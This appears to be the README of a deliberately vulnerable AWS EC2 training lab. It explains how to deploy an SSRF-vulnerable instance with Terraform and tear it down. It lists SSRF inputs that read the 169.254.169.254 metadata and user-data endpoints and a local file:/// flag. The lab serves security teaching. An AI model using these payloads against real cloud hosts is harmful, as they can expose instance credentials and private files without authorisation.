# AWS EC2 SSRF Vulnerable Environment

English | [中文](./README_CN.md)

## Description

This is a scenario used to build the AWS EC2 SSRF vulnerability environment.

After building the environment with Terraform, users can obtain metadata and user data and other information on EC2 through the SSRF vulnerabilities.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/aws/ec2/ec2_ssrf/
```

Configure AWS Access Credentials

```shell
aws configure
```

![img](../../../images/1651044031.png)

> You can see the access key in the AWS [Console --> Security Credentials]

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

![img](../../../images/1650428695.png)

After the environment is set up, You can see the access address of the scenario at Outputs, then access to the browser.

![img](../../../images/1650429022.png)

## Vulnerability Utilization

On EC2 with SSRF vulnerabilities, we can use SSRF to read EC2 metadata, user data and other information.

read metadata

```shell
http://169.254.169.254/latest/meta-data/
```

![img](../../../images/1650429215.png)

read user data

> The premise is that the target has been configured with user data, otherwise will be disconnected.

```shell
http://169.254.169.254/latest/user-data
```

![img](../../../images/1650429432.png)

In the user data information, you can see that there is a flag file in the root directory of the scenario, try to use SSRF to read this file.

```shell
file:///flag69152201.txt
```

![img](../../../images/1650429930.png)

Successfully read the flag file.

## Destroy the environment

```shell
terraform destroy
```
